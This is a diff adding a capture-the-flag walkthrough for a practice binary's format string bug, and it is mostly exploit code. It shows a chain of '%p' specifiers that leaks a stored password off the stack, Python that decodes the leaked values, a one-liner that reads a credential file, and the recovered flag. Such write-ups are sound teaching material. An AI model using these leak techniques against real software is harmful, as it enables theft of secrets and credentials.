@@ -1,0 +1,54 @@
+# Level 02 Walkthrough - Format String Leak
+
+## Vulnerability
+
+On a wrong password, the binary calls `printf(username)` — using untrusted user
+input directly as a format string. This lets us read arbitrary values off the stack.
+
+```c
+printf(username);   // VULNERABLE: username is the format string
+```
+
+## What's on the Stack
+
+The binary reads the level03 password from `/home/users/level03/.pass` into a
+local buffer at `rbp-0xa0` before asking for any input.
+
+Stack layout at the printf call site (rbp-0x70 = username buffer):
+
+| %n$p offset | Contents |
+|-------------|----------|
+| %8          | format string itself ("%p.%p...") |
+| %22–%26     | file_password (5 × 8 bytes = 40 chars + stripped newline) |
+
+## Exploit
+
+Send a chain of `%p` format specifiers as the username and any wrong password:
+
+```bash
+python -c "print '%p.'*40 + '\nwrongpass'" | ./level02
+```
+
+Positions 22–26 contain the password. Decode each 64-bit value from little-endian:
+
+```python
+vals = [0x756e505234376848, 0x45414a3561733951,
+        0x377a7143574e6758, 0x354a35686e475873, 0x48336750664b394d]
+result = ''
+for v in vals:
+    for i in range(8):
+        b = (v >> (8*i)) & 0xff
+        if b: result += chr(b)
+# -> "Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"
+```
+
+## One-liner (get shell)
+
+```bash
+(python -c "print 'user\nHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'"; \
+ echo "cat /home/users/level03/.pass") | ./level02
+```
+
+## Flag
+
+`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
